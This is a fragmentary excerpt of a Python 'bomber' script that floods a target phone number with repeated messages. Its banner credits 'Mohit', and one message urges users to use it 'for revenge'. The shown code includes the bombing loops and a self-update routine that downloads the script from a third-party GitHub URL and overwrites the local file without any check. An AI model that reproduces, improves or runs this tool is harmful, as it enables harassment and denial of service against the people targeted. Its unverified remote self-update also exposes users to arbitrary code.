...
W='\033[0m'
# The Credit For This Code Goes To Mohit
...
def banner():
    ...
    clr()
    logo=""" __  __       _     _ _   ____                  _
|  \/  | ___ | |__ (_) |_| __ )  ___  _ __ ___ | |__
| |\/| |/ _ \| '_ \| | __|  _ \ / _ \| '_ ` _ \| '_ \ 
| |  | | (_) | | | | | |_| |_) | (_) | | | | | | |_) |
|_|  |_|\___/|_| |_|_|\__|____/ \___/|_| |_| |_|_.__/
                                         """
...
def infinite(pn, dl, ch, max):
    ...
    while True:
        ...
        count_inf += 1
        # os.system('echo Mohit >> count.xxx')
        time.sleep(float(dl))
        if (count_inf > maxlim):
            exit()
...
def checkinternet():
    ...
    try:
        ...
        res = True
    if res:
        print("\n\n\ Your Connection Is Slow Stupid! Internet...")
        print('\t\t\Bombing is Stopping! ...\n\n')
        banner()
        exit()
...
def start(target, counter, delay, ch, cc):
    ...
    while success < (int(bombs)):
        ...
        try:
            ...
            if cc == "91":
                ...
                if success > 0:
                    ...
                    input(
                        '\nThis will help Me to give support to your country fast...\n\nPress Enter To Exit...')
                    ...
                    print(
                        '\t\tPlease Send A Mail To itsmohitkumarbro@gmail.com ...')
                    input('Press Enter To Exit...')
                    exit()
        ...
        print("==================================================================")
        print("              Don't Use this for fun, Use It for revenge !!                ")
        print("              This Bomber Was Created By Mohit !!                ")
        print("==================================================================")
        try:
...
def update():
    stuff_to_update = ['mbomber.py', '.version']
    for fl in stuff_to_update:
        dat = urllib.request.urlopen(
      "https://raw.githubusercontent.com/x-hacker-mafia-x/Test/master/" + fl).read()
        file = open(fl, 'wb')
        file.write(dat)
        file.close()
    print('\n\t\tUpdated Successfull !!!!')
...
ver = urllib.request.urlopen(
  "https://raw.githubusercontent.com/x-hacker-mafia-x/Test/master/.version").read().decode('utf-8')
verl = ''
try:
...
try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/x-hacker-mafia-x/Test/master/.notify").read().decode('utf-8')
...
if cc == "91":
    ...
    maxlim = 100
if nm > maxlim:
    print('\n\n\tTo Misuse Of This Script I Can Provide ' +
